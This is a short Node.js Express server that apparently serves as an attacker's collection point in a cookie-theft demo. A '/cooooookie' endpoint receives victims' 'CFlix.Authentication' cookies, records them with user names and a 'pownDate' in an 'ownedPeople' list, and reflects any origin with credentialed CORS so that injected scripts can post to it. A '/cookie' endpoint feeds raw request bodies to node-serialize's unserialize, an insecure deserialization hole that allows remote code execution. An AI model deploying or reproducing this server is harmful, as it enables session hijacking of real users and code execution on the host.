var express = require('express');
var bodyParser = require('body-parser');
var serialize = require('node-serialize');
var logger = require('morgan');
var app = express();
var ownedPeople = [];
const characterKeeped = 60;

app.use(bodyParser.text({ type: "*/*" }));
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
    extended: true
}));

logger.token('reqcontent', function (req, res) { return req.body; });

app.use(logger(':remote-addr - :remote-user [:date[clf]] ":method :url HTTP/:http-version" :status :reqcontent', {
    skip: function (req, res) {
        return req.originalUrl !== "/cookie";
    }
}));

app.get('/', function (req, res) {
    res.end('ok');
});

app.post('/cookie', function (req, res) {
    try {
        var aspCookie = serialize.unserialize(req.body);
        // console.log(aspCookie);
        res.send(aspCookie);
    } catch (error) {
        res.status(500).send(error.message);
    }
});


function getCookieFromString(cookieString, cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(cookieString);
    var ca = decodedCookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

app.post('/cooooookie', function (req, res) {
    var aspCookie = getCookieFromString(req.body.cookies, "CFlix.Authentication");

    ownedPeople.push({
        user: req.body.user,
        cookie: aspCookie.length - characterKeeped < 0 ?
            aspCookie.substr(0, aspCookie.length) :
            aspCookie.substr(0, characterKeeped) + "...",
        pownDate: new Date()
    });

    try {
        res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT');
        res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');
        res.setHeader('Access-Control-Allow-Credentials', true);
    } catch (error) {

    }

    res.send(ownedPeople);
});

var server = app.listen(1337, function () {
    var host = server.address().address;
    var port = server.address().port;
    console.log("Running !");
});